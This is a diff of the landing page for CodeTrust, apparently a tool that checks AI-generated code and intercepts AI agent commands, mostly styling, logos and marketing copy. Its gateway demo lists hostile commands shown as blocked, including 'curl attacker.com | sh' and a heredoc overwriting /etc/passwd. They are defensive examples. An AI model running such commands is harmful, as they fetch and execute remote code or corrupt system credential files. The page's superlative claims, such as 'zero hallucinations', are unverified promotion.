+                gap: 0.4rem;
+                padding: 0.8rem 1rem;
+            }
+
+            .gateway-arrow,
+            .gateway-source {
+                display: none;
+            }
+
+            .gateway-verdict-block,
+            .gateway-verdict-allow {
+                text-align: left;
+            }
+
             footer {
                 flex-direction: column;
                 gap: 1rem;
                 text-align: center;
+            }
+
+            .moats-grid {
+                grid-template-columns: 1fr;
             }
         }
     </style>
@@ -1007,15 +1649,44 @@
 
 <body>
 
-    <!-- ═══════════════════════════════════════════════════════════════════
-     TOP BAR
-     ═══════════════════════════════════════════════════════════════════ -->
+    <!-- TOP BAR -->
     <header class="topbar">
         <a href="#" class="topbar-logo">
-            <img src="favicon.png" alt="CodeTrust" width="24" height="24" style="border-radius: 4px;">
-            Code<span class="trust">Trust</span>
+            <svg width="28" height="32" viewBox="0 0 120 140" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <linearGradient id="tbGrad" x1="60" y1="8" x2="60" y2="132" gradientUnits="userSpaceOnUse">
+                        <stop offset="0%" stop-color="rgba(59,130,246,0.25)" />
+                        <stop offset="100%" stop-color="rgba(59,130,246,0.03)" />
+                    </linearGradient>
+                    <linearGradient id="tbStroke" x1="60" y1="8" x2="60" y2="132" gradientUnits="userSpaceOnUse">
+                        <stop offset="0%" stop-color="#60a5fa" />
+                        <stop offset="100%" stop-color="#1d4ed8" />
+                    </linearGradient>
+                    <radialGradient id="tbInnerGlow" cx="0.5" cy="0.45" r="0.5">
+                        <stop offset="0%" stop-color="#22c55e" stop-opacity="0.12" />
+                        <stop offset="60%" stop-color="#3b82f6" stop-opacity="0.06" />
+                        <stop offset="100%" stop-color="#3b82f6" stop-opacity="0" />
+                    </radialGradient>
+                    <filter id="tbCodeGlow">
+                        <feGaussianBlur stdDeviation="2" result="blur" />
+                        <feMerge>
+                            <feMergeNode in="blur" />
+                            <feMergeNode in="SourceGraphic" />
+                        </feMerge>
+                    </filter>
+                </defs>
+                <path d="M60 8L12 30v40c0 32 20 52 48 62 28-10 48-30 48-62V30L60 8z" fill="url(#tbGrad)"
+                    stroke="url(#tbStroke)" stroke-width="4" />
+                <path d="M60 18L22 36v32c0 26 16 44 38 52 22-8 38-26 38-52V36L60 18z" fill="none"
+                    stroke="rgba(96,165,250,0.1)" stroke-width="1" />
+                <text x="60" y="76" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="40"
+                    font-weight="700" fill="#22c55e" filter="url(#tbCodeGlow)">&lt;/&gt;</text>
+                <path d="M44 94l12 12 20-24" stroke="#3b82f6" stroke-width="5" stroke-linecap="round"
+                    stroke-linejoin="round" fill="none" filter="url(#tbCodeGlow)" />
+                <circle cx="60" cy="70" r="35" fill="url(#tbInnerGlow)" opacity="0.6" />
+            </svg>
+            <span class="code" style="margin-left:0.45rem">Code</span><span class="trust">Trust</span>
         </a>
-
         <button class="mobile-toggle" onclick="document.querySelector('.topbar-nav').classList.toggle('open')"
             aria-label="Menu">
             <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
@@ -1024,11 +1695,10 @@
                 <rect y="15" width="20" height="2" rx="1" />
             </svg>
         </button>
-
         <nav class="topbar-nav">
-            <a href="#problem">Why</a>
+            <a href="#moats">Three Moats</a>
+            <a href="#enforcement">Enforcement</a>
             <a href="#pipeline">Layers</a>
-            <a href="#rules">Rules</a>
             <a href="#demo">Proof</a>
             <a href="https://pypi.org/project/codetrust/" target="_blank">PyPI</a>
             <a href="https://marketplace.visualstudio.com/items?itemName=SaidBorna.codetrust" target="_blank"
@@ -1036,24 +1706,65 @@
         </nav>
     </header>
 
-    <!-- ═══════════════════════════════════════════════════════════════════
-     HERO
-     ═══════════════════════════════════════════════════════════════════ -->
+    <!-- HERO -->
     <section class="hero">
         <div class="hero-content">
-            <img src="logo.png" alt="CodeTrust" width="280" style="display: block; margin: 0 auto 2rem;">
-            <span class="hero-version">845 tests passing — 9 layers — 62 rules — zero hallucinations</span>
-            <h1>Trust the code<br><em>Ship with proof</em></h1>
-            <p class="hero-text">
-                AI writes code fast. But fast doesn't mean safe. CodeTrust runs every line through
-                9 verification layers — catching hallucinated packages, broken configs, anti-patterns,
-                container issues, and CI/CD misconfigurations before they hit production. Built by one engineer. Backed
-                by 845 tests.
-            </p>
+            <div class="hero-logo">
+                <svg viewBox="0 0 120 140" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <defs>
+                        <linearGradient id="shieldGrad" x1="60" y1="8" x2="60" y2="132" gradientUnits="userSpaceOnUse">
+                            <stop offset="0%" stop-color="rgba(59,130,246,0.25)" />
+                            <stop offset="100%" stop-color="rgba(59,130,246,0.03)" />
+                        </linearGradient>
+                        <linearGradient id="shieldStroke" x1="60" y1="8" x2="60" y2="132"
+                            gradientUnits="userSpaceOnUse">
+                            <stop offset="0%" stop-color="#60a5fa" />
+                            <stop offset="100%" stop-color="#1d4ed8" />
+                        </linearGradient>
+                        <radialGradient id="innerGlow" cx="0.5" cy="0.45" r="0.5">
+                            <stop offset="0%" stop-color="#22c55e" stop-opacity="0.12" />
+                            <stop offset="60%" stop-color="#3b82f6" stop-opacity="0.06" />
+                            <stop offset="100%" stop-color="#3b82f6" stop-opacity="0" />
+                        </radialGradient>
+                        <filter id="codeGlow">
+                            <feGaussianBlur stdDeviation="2" result="blur" />
+                            <feMerge>
+                                <feMergeNode in="blur" />
+                                <feMergeNode in="SourceGraphic" />
+                            </feMerge>
+                        </filter>
+                    </defs>
+                    <!-- Shield body -->
+                    <path d="M60 8L12 30v40c0 32 20 52 48 62 28-10 48-30 48-62V30L60 8z" fill="url(#shieldGrad)"
+                        stroke="url(#shieldStroke)" stroke-width="4" />
+                    <!-- Inner highlight ring -->
+                    <path d="M60 18L22 36v32c0 26 16 44 38 52 22-8 38-26 38-52V36L60 18z" fill="none"
+                        stroke="rgba(96,165,250,0.1)" stroke-width="1" />
+                    <!-- </> code symbol -->
+                    <text x="60" y="76" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="40"
+                        font-weight="700" fill="#22c55e" filter="url(#codeGlow)">&lt;/&gt;</text>
+                    <!-- Checkmark -->
+                    <path d="M44 94l12 12 20-24" stroke="#3b82f6" stroke-width="5" stroke-linecap="round"
+                        stroke-linejoin="round" fill="none" filter="url(#codeGlow)" />
+                    <!-- Inner glow -->
+                    <circle cx="60" cy="70" r="35" fill="url(#innerGlow)" opacity="0.6" />
+                </svg>
+                <span class="hero-logo-text"><span class="code">Code</span><span class="trust">Trust</span></span>
+            </div>
+            <span class="hero-version">v2.1.0 &mdash; 1314 tests &mdash; 10 layers &mdash; 132 rules &mdash; zero
+                hallucinations</span>
+            <h1>Prevent unsafe AI code<span class="line2">Before it executes</span></h1>
+            <div class="hero-strikes">
+                <span class="strike-line">Not a linter. Not a scanner.</span>
+            </div>
+            <div class="hero-positive">
+                <span class="positive-line">The AI Governance Enforcement Layer that <strong>prevents</strong> &mdash;
+                    not detects.</span>
+            </div>
             <div class="hero-actions">
                 <a href="https://marketplace.visualstudio.com/items?itemName=SaidBorna.codetrust"
                     class="btn btn-primary" target="_blank">Install for VS Code</a>
-                <a href="#demo" class="btn btn-ghost">See the proof</a>
+                <a href="#moats" class="btn btn-ghost">See three moats</a>
             </div>
             <div class="hero-pip">
                 <code
@@ -1063,295 +1774,560 @@
         </div>
     </section>
 
-    <!-- ═══════════════════════════════════════════════════════════════════
-     THE PROBLEM
-     ═══════════════════════════════════════════════════════════════════ -->
-    <section class="narrative" id="problem">
-        <div class="narrative-grid reveal">
-            <div class="narrative-left">
-                <div class="section-tag">The Problem</div>
-                <h2>AI code ships untested,<br>unchecked, unverified</h2>
-                <p class="narrative-lead">
-                    Copilot generates a package import. It looks right. It compiles.
-                    But the package doesn't exist — it was hallucinated. Your Docker image
-                    references a tag that was never published. Your SQL migration uses
-                    FLOAT for money and drops FK constraints without a safety net.
-                    <br><br>
-                    Every linter checks syntax. <strong>Nobody checks trust.</strong>
-                </p>
-            </div>
+    <!-- USAGE METRICS -->
+    <div class="usage-bar reveal">
+        <div class="usage-item">
+            <div class="usage-num" data-count="0" data-key="total_scans">0</div>
+            <div class="usage-label">Scans performed</div>
+        </div>
+        <div class="usage-item">
+            <div class="usage-num" data-count="0" data-key="hallucinated_packages_prevented">0</div>
+            <div class="usage-label">Hallucinated packages prevented</div>
+        </div>
+        <div class="usage-item">
+            <div class="usage-num" data-count="0" data-key="destructive_commands_blocked">0</div>
+            <div class="usage-label">Destructive commands blocked</div>
+        </div>
+    </div>
+    <div class="telemetry-note">Verified Cloud API telemetry. Local CLI, VS Code, and CI runs are not included.</div>
 
-            <div class="problem-list">
-                <div class="problem-item">
-                    <span class="problem-label label-block">BLOCK</span>
-                    <h4>Hallucinated packages</h4>
-                    <p>AI invents package names that sound real but don't exist on PyPI, npm, or crates.io — your build
-                        breaks in CI, or worse, you install a typosquatted package</p>
+    <!-- WORKS WITH -->
+    <div class="works-with reveal">
+        <span class="works-with-label">Works with</span>
+        <span class="works-with-item">
+            <svg viewBox="0 0 24 24" fill="none">
+                <path
+                    d="M23.15 2.587L18.21.21a1.166 1.166 0 0 0-1.377.263L8.09 9.913l-4.14-3.14a.78.78 0 0 0-.996.037L.66 9.013a.78.78 0 0 0 .006 1.17l3.608 3.3-3.608 3.3a.78.78 0 0 0-.006 1.17l2.295 2.203a.78.78 0 0 0 .996.037l4.14-3.14 8.743 9.44a1.166 1.166 0 0 0 1.376.262l4.94-2.377a1.166 1.166 0 0 0 .68-1.059V3.647a1.166 1.166 0 0 0-.68-1.06zM17.66 19.29L10.2 12.49l7.46-6.8v13.6z"
+                    fill="#007ACC" />
+            </svg>
+            VS Code
+        </span>
+        <span class="works-with-item">
+            <svg viewBox="0 0 24 24" fill="#e8e8ec">
+                <path
+                    d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12" />
+            </svg>
+            GitHub
+        </span>
+        <span class="works-with-item">
+            <svg viewBox="0 0 24 24" fill="none">
+                <circle cx="12" cy="12" r="11" stroke="#D97706" stroke-width="2" /><text x="12" y="16.5"
+                    text-anchor="middle" font-family="sans-serif" font-size="11" font-weight="700"
+                    fill="#D97706">C</text>
+            </svg>
+            Claude Code
+        </span>
+        <span class="works-with-item">
+            <svg viewBox="0 0 24 24" fill="none">
+                <rect x="2" y="2" width="20" height="20" rx="4" stroke="#00B4D8" stroke-width="2" />
+                <path d="M8 12h8M12 8v8" stroke="#00B4D8" stroke-width="2" stroke-linecap="round" />
+            </svg>
+            Cursor
+        </span>
+        <span class="works-with-item">
+            <svg viewBox="0 0 24 24" fill="none">
+                <path d="M12 2L2 7v10l10 5 10-5V7L12 2z" stroke="#06b6d4" stroke-width="2" fill="none" />
+                <path d="M2 7l10 5 10-5M12 22V12" stroke="#06b6d4" stroke-width="2" />
+            </svg>
+            MCP
+        </span>
+    </div>
+
+    <!-- STATS BAR -->
+    <div class="stats-bar reveal">
+        <div class="stat-item">
+            <div class="stat-num">132</div>
+            <div class="stat-label">Enforcement Rules</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-num">10</div>
+            <div class="stat-label">Verification Layers</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-num">17</div>
+            <div class="stat-label">MCP Tools</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-num">26</div>
+            <div class="stat-label">API Endpoints</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-num">1314</div>
+            <div class="stat-label">Tests Passing</div>
+        </div>
+    </div>
+
+    <!-- THREE MOATS -->
+    <section class="container" id="moats">
+        <div class="section-tag section-center">Competitive Advantage</div>
+        <h2 class="reveal">Three moats no other tool has</h2>
+        <p class="section-desc reveal">SonarQube has 5,000 rules. Snyk knows every CVE.<br>Semgrep does cross-file
+            dataflow.</p>
+        <div class="moat-highlight reveal">None of them have any of these three capabilities.</div>
+
+        <div class="moats-grid reveal">
+            <div class="moat-card">
+                <div class="moat-icon moat-icon-gateway">&#x26D4;</div>
+                <h3>AI Governance Gateway</h3>
+                <p>Pre-execution interception of AI agent commands. Validates every terminal command,
+                    file write, and package install against configurable policies &mdash; <strong>before it
+                        runs</strong>.</p>
+                <div class="moat-stat">
+                    <div class="moat-stat-num">57</div>
+                    <span class="t-dim">real-time interception rules</span>
                 </div>
-                <div class="problem-item">
-                    <span class="problem-label label-block">BLOCK</span>
-                    <h4>Ghost Docker images</h4>
-                    <p>Base images with non-existent tags — you find out when the Dockerfile fails to build at 2AM on
-                        deploy night</p>
+            </div>
+            <div class="moat-card">
+                <div class="moat-icon moat-icon-halluc">&#x1F50D;</div>
+                <h3>Hallucination Detection</h3>
+                <p>Extracts imports from source files and verifies every package against live PyPI and npm registries.
+                    Catches packages that <strong>don't exist</strong> &mdash; with exact file and line number.</p>
+                <div class="moat-stat">
+                    <div class="moat-stat-num">13</div>
+                    <span class="t-dim">AI-specific hallucination rules</span>
                 </div>
-                <div class="problem-item">
-                    <span class="problem-label label-warn">WARN</span>
-                    <h4>Silent anti-patterns</h4>
-                    <p>eval(), hardcoded secrets, mutable defaults, bare excepts — code that passes linting but fails in
-                        production</p>
-                </div>
-                <div class="problem-item">
-                    <span class="problem-label label-block">BLOCK</span>
-                    <h4>Dangerous SQL</h4>
-                    <p>DELETE without WHERE, FLOAT for monetary values, GRANT ALL on production — AI doesn't understand
-                        consequences</p>
+            </div>
+            <div class="moat-card">
+                <div class="moat-icon moat-icon-drift">&#x1F4C8;</div>
+                <h3>Trust Score &amp; Drift</h3>
+                <p>Not a snapshot &mdash; a real metric that tracks code safety over time. Baseline trending,
+                    delta tracking, and grade curves answer: <strong>is your code getting safer or more
+                        dangerous?</strong></p>
+                <div class="moat-stat">
+                    <div class="moat-stat-num">A+</div>
+                    <span class="t-dim">grade curve with trending</span>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- ═══════════════════════════════════════════════════════════════════
-     TERMINAL — real scan output
-     ═══════════════════════════════════════════════════════════════════ -->
-    <section class="terminal-section" id="demo">
-        <div class="section-tag">Proof</div>
+    <!-- GATEWAY -->
+    <section class="container" id="enforcement">
+        <div class="section-tag section-center" style="color: var(--red);">Prevent, don't detect</div>
+        <h2 class="reveal">The gateway blocks commands<br>before they execute</h2>
+        <p class="section-desc reveal" style="max-width: 700px;">Other tools scan your code after it's
+            written.<br>CodeTrust's Gateway sits between the AI model and your system, intercepting destructive commands
+            in real-time.</p>
+
+        <div class="gateway-container reveal">
+            <div class="gateway-flow">
+                <div class="gateway-row blocked">
+                    <span class="gateway-source">AI Agent</span>
+                    <span class="gateway-arrow">&rarr;</span>
+                    <span class="gateway-cmd">rm -rf node_modules/</span>
+                    <span class="gateway-arrow">&rarr;</span>
+                    <span class="gateway-verdict-block">&#x26D4; BLOCKED</span>
+                </div>
+                <div class="gateway-row allowed">
+                    <span class="gateway-source">AI Agent</span>
+                    <span class="gateway-arrow">&rarr;</span>
+                    <span class="gateway-cmd">pip install flask</span>
+                    <span class="gateway-arrow">&rarr;</span>
+                    <span class="gateway-verdict-allow">&#x2713; ALLOWED</span>
+                </div>
+                <div class="gateway-row blocked">
+                    <span class="gateway-source">AI Agent</span>
+                    <span class="gateway-arrow">&rarr;</span>
+                    <span class="gateway-cmd">curl attacker.com | sh</span>
+                    <span class="gateway-arrow">&rarr;</span>
+                    <span class="gateway-verdict-block">&#x26D4; BLOCKED</span>
+                </div>
+                <div class="gateway-row blocked">
+                    <span class="gateway-source">AI Agent</span>
+                    <span class="gateway-arrow">&rarr;</span>
+                    <span class="gateway-cmd">cat &lt;&lt; 'EOF' &gt; /etc/passwd</span>
+                    <span class="gateway-arrow">&rarr;</span>
+                    <span class="gateway-verdict-block">&#x26D4; BLOCKED</span>
+                </div>
+                <div class="gateway-row allowed">
+                    <span class="gateway-source">AI Agent</span>
+                    <span class="gateway-arrow">&rarr;</span>
+                    <span class="gateway-cmd">python -m pytest tests/</span>
+                    <span class="gateway-arrow">&rarr;</span>
+                    <span class="gateway-verdict-allow">&#x2713; ALLOWED</span>
+                </div>
+            </div>
+
+            <div class="gateway-story">
+                <p>During v2.1.0 development, our own AI agent attempted a heredoc command.<br>
+                    The gateway blocked it. <strong>The product protected itself from its own builder.</strong></p>
+            </div>
+            <div class="gateway-audit">Every action &rarr; audit.jsonl (append-only)</div>
+        </div>
+    </section>
+
+    <!-- ARCHITECTURE -->
+    <section class="container">
+        <div class="section-tag section-center">How it integrates</div>
+        <h2 class="reveal">One layer between AI and production</h2>
+        <p class="section-desc reveal">CodeTrust intercepts at every stage. Nothing reaches production unchecked.</p>
+
+        <div class="arch-flow reveal">
+            <div class="arch-node">
+                <span class="arch-icon">&#x1F916;</span>
+                AI Agent
+            </div>
+            <span class="arch-arrow arch-arrow-block">&xrarr;</span>
+            <div class="arch-node arch-node-ct">
+                <span class="arch-icon">&#x1F6E1;</span>
+                CodeTrust
+            </div>
+            <span class="arch-arrow arch-arrow-pass">&xrarr;</span>
+            <div class="arch-node">
+                <span class="arch-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#e8e8ec" style="vertical-align:middle">
+                        <path
+                            d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12" />
+                    </svg>
+                </span>
+                Git
+            </div>
+            <span class="arch-arrow">&xrarr;</span>
+            <div class="arch-node">
+                <span class="arch-icon">&#x2699;</span>
+                CI / CD
+            </div>
+            <span class="arch-arrow arch-arrow-pass">&xrarr;</span>
+            <div class="arch-node arch-node-safe">
+                <span class="arch-icon">&#x2705;</span>
+                Production
+            </div>
+        </div>
+        <p class="reveal"
+            style="text-align: center; font-family: 'IBM Plex Mono', monospace; font-size: 0.72rem; color: var(--text-3); margin-top: 1.8rem;">
+            CLI &middot; VS Code &middot; GitHub Action &middot; MCP Server &middot; Cloud API &mdash; same enforcement,
+            every surface
+        </p>
+    </section>
+
+    <!-- TRUST SCORE -->
+    <section class="container">
+        <div class="score-grid reveal">
+            <div class="score-visual">
+                <div class="score-circle">
+                    <div class="score-num">94</div>
+                    <div class="score-grade">Grade A</div>
+                </div>
+                <div class="score-meta">
+                    <div class="score-meta-item">
+                        <div class="score-meta-val">0</div>
+                        <div class="score-meta-label">Hallucinations</div>
+                    </div>
+                    <div class="score-meta-item">
+                        <div class="score-meta-val">3</div>
+                        <div class="score-meta-label">Findings</div>
+                    </div>
+                    <div class="score-meta-item">
+                        <div class="score-meta-val">47</div>
+                        <div class="score-meta-label">Files scanned</div>
+                    </div>
+                </div>
+                <div class="score-trend">&#x2191; improving (+6 from baseline)</div>
+
+                <!-- Trend graph -->
+                <div class="trend-graph">
+                    <div class="trend-label">Trust Score &mdash; last 12 scans</div>
+                    <div class="trend-bars">
+                        <div class="trend-bar trend-bar-ok" style="height: 55%" title="72"></div>
+                        <div class="trend-bar trend-bar-ok" style="height: 58%" title="74"></div>
+                        <div class="trend-bar trend-bar-bad" style="height: 42%" title="63"></div>
+                        <div class="trend-bar trend-bar-ok" style="height: 52%" title="70"></div>
+                        <div class="trend-bar trend-bar-ok" style="height: 60%" title="76"></div>
+                        <div class="trend-bar trend-bar-good" style="height: 68%" title="81"></div>
+                        <div class="trend-bar trend-bar-good" style="height: 72%" title="84"></div>
+                        <div class="trend-bar trend-bar-good" style="height: 75%" title="86"></div>
+                        <div class="trend-bar trend-bar-good" style="height: 70%" title="83"></div>
+                        <div class="trend-bar trend-bar-good" style="height: 80%" title="88"></div>
+                        <div class="trend-bar trend-bar-good" style="height: 88%" title="92"></div>
+                        <div class="trend-bar trend-bar-good" style="height: 94%" title="94"></div>
+                    </div>
+                    <div class="trend-axis">
+                        <span>12 scans ago</span>
+                        <span>now</span>
+                    </div>
+                </div>
+            </div>
+            <div class="score-text">
+                <div class="section-tag">Continuous Governance</div>
+                <h2>Is your AI code<br><span class="gradient-green">getting safer?</span></h2>
+                <p>Every scan produces a Trust Score. Hallucination findings are penalized 15x.
+                    The baseline persists between runs. Delta tracking shows improvement or regression.</p>
+                <ul class="score-features">
+                    <li>Grade curve: A+ / A / B+ / B / C+ / C / D / F</li>
+                    <li>Baseline stored in .codetrust/drift_baseline.json</li>
+                    <li>Trend analysis: improving / degrading / stable</li>
+                    <li>100 data points retained for history</li>
+                    <li>AI trust sub-score weighted by hallucination count</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <!-- THE PROBLEM -->
+    <section class="container" id="problem">
+        <div class="narrative-grid reveal">
+            <div class="narrative-left">
+                <div class="section-tag">The Problem</div>
+                <h2
+                    style="font-size: 2.4rem; font-weight: 700; letter-spacing: -0.03em; color: var(--white); margin-bottom: 1.2rem; white-space: nowrap;">
+                    AI agents act autonomously.<br>Nobody checks what they do.</h2>
+                <p class="narrative-lead">
+                    Your AI agent suggests a package import &mdash; it looks right, it compiles.
+                    But the package doesn't exist. It was hallucinated. Your production build
+                    installs a typosquatted backdoor instead.
+                    <br><br>
+                    Every linter checks syntax. <strong>Nobody enforces governance on AI agents.</strong>
+                </p>
+            </div>
+            <div class="problem-list">
+                <div class="problem-item">
+                    <span class="problem-label label-block">BLOCK</span>
+                    <h4>Destructive commands</h4>
+                    <p>AI agents run rm -rf, eval(), curl | sh autonomously &mdash; data loss, RCE, supply chain
+                        compromise</p>
+                </div>
+                <div class="problem-item">
+                    <span class="problem-label label-block">BLOCK</span>
+                    <h4>Hallucinated packages</h4>
+                    <p>AI invents package names that don't exist on PyPI, npm, or crates.io &mdash; typosquatted malware
+                        installs silently</p>
+                </div>
+                <div class="problem-item">
+                    <span class="problem-label label-block">BLOCK</span>
+                    <h4>Ghost Docker images</h4>
+                    <p>Base images with non-existent tags &mdash; build fails at 2AM on deploy night</p>
+                </div>
+                <div class="problem-item">
+                    <span class="problem-label label-warn">WARN</span>
+                    <h4>Invisible code drift</h4>
+                    <p>AI code quality degrades gradually. No one measures it. Technical debt accumulates without signal
+                    </p>
+                </div>
+                <div class="problem-item">
+                    <span class="problem-label label-prevent">CODETRUST</span>
+                    <h4>All prevented, not detected</h4>
+                    <p>Gateway blocks before execution. Import verification catches before install. Drift score tracks
+                        continuously</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- TERMINAL DEMO -->
+    <section class="container" id="demo" style="max-width: 900px;">
+        <div class="section-tag section-center">Proof</div>
         <h2 class="reveal">Real scan, real output</h2>
-        <p class="section-desc reveal">Actual deep scan API response — hallucinated package caught, anti-patterns
-            flagged, verdict delivered</p>
+        <p class="section-desc reveal">Hallucinated package caught. Anti-patterns flagged. Trust score calculated. All
+            in one command.</p>
 
         <div class="terminal reveal">
             <div class="terminal-bar">
                 <div class="terminal-dot" style="background:#ff5f57"></div>
                 <div class="terminal-dot" style="background:#febc2e"></div>
                 <div class="terminal-dot" style="background:#28c840"></div>
-                <span class="terminal-bar-title">codetrust — POST /v1/scan/deep</span>
+                <span class="terminal-bar-title">codetrust scan app.py</span>
             </div>
             <div class="terminal-body">
-                <span class="t-prompt">$</span> <span class="t-cmd">curl -X POST /v1/scan/deep -d '{"code": "...",
-                    "filename": "app.py"}'</span>
-                <br>
-                <br>{
-                <br>&nbsp;&nbsp;<span class="t-key">"verdict"</span>: <span class="t-block">"BLOCK"</span>,
-                <br>&nbsp;&nbsp;<span class="t-key">"total_findings"</span>: <span class="t-val-num">5</span>,
-                <br>&nbsp;&nbsp;<span class="t-key">"findings"</span>: [
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;{
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-key">"rule_id"</span>: <span
-                    class="t-val-str">"package_not_found"</span>,
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-key">"severity"</span>: <span
-                    class="t-block">"BLOCK"</span>,
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-key">"message"</span>: <span
-                    class="t-val-str">"Package 'flask-restplus' not found on PyPI"</span>
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;},
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;{
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-key">"rule_id"</span>: <span
-                    class="t-val-str">"hardcoded_secret"</span>,
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-key">"severity"</span>: <span
-                    class="t-block">"BLOCK"</span>,
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-key">"message"</span>: <span
-                    class="t-val-str">"Possible hardcoded secret — use env variables"</span>
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;},
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;{
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-key">"rule_id"</span>: <span
-                    class="t-val-str">"high_complexity"</span>,
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-key">"severity"</span>: <span
-                    class="t-warn">"WARN"</span>,
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-key">"message"</span>: <span
-                    class="t-val-str">"Cyclomatic complexity 14 exceeds threshold"</span>
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;}
-                <br>&nbsp;&nbsp;],
-                <br>&nbsp;&nbsp;<span class="t-key">"packages"</span>: [
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;{ <span class="t-key">"package"</span>: <span
-                    class="t-val-str">"flask"</span>, <span class="t-key">"status"</span>: <span
-                    class="t-pass">"VERIFIED"</span> },
-                <br>&nbsp;&nbsp;&nbsp;&nbsp;{ <span class="t-key">"package"</span>: <span
-                    class="t-val-str">"flask-restplus"</span>, <span class="t-key">"status"</span>: <span
-                    class="t-block">"NOT_FOUND"</span> }
-                <br>&nbsp;&nbsp;]
-                <br>}
-                <br>
+                <span class="t-prompt">$</span> <span class="t-cmd">codetrust scan app.py</span>
+                <br><br>
+                <span class="t-dim">&#x1F50D; Verifying imports against registries... (1 file(s))</span>
+                <br><span class="t-dim">&nbsp;&nbsp;&nbsp;Found 1 unverified import(s)</span>
+                <br><br>
+                <span class="t-pass">&#x1F6E1;&#xFE0F; CodeTrust Scan</span>
+                <br>&nbsp;&nbsp;&nbsp;<span class="t-key">Files:</span> <span class="t-val-num">1</span>
+                &nbsp;|&nbsp;<span class="t-key">Findings:</span> <span class="t-val-num">2</span>
+                <br>&nbsp;&nbsp;&nbsp;<span class="t-key">AI Drift Score:</span> <span class="t-val-num">87/100</span>
+                <span class="t-dim">(B)</span>
+                <br>&nbsp;&nbsp;&nbsp;<span class="t-key">Trend:</span> <span class="t-warn">degrading (-4 from
+                    baseline)</span>
+                <br><br>
+                &nbsp;&nbsp;<span class="t-block">&#x1F6AB; BLOCK &mdash; must fix:</span>
+                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-dim">app.py:4</span> <span
+                    class="t-key">[import_not_found]</span> <span class="t-val-str">Package 'flask_magic_utils' not
+                    found on pypi &mdash; possible AI hallucination</span>
+                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-dim">app.py:12</span> <span
+                    class="t-key">[hardcoded_secret]</span> <span class="t-val-str">Possible hardcoded secret &mdash;
+                    use env variables</span>
                 <div class="t-verdict-line">
-                    <span class="t-dim">Hallucinated package caught before it reached production</span>
+                    <span class="t-dim">flask_magic_utils does not exist on PyPI. No other tool catches this.</span>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- ═══════════════════════════════════════════════════════════════════
-     PIPELINE
-     ═══════════════════════════════════════════════════════════════════ -->
-    <section class="pipeline" id="pipeline">
-        <div class="section-tag">Architecture</div>
-        <h2 class="reveal">9 layers — each catches what<br>the last one can't</h2>
-        <p class="section-desc reveal">Code enters at Layer 1. If it survives all 9, it ships. If not — you know exactly
-            why</p>
+    <!-- PIPELINE -->
+    <section class="container" id="pipeline">
+        <div class="section-tag section-center">Architecture</div>
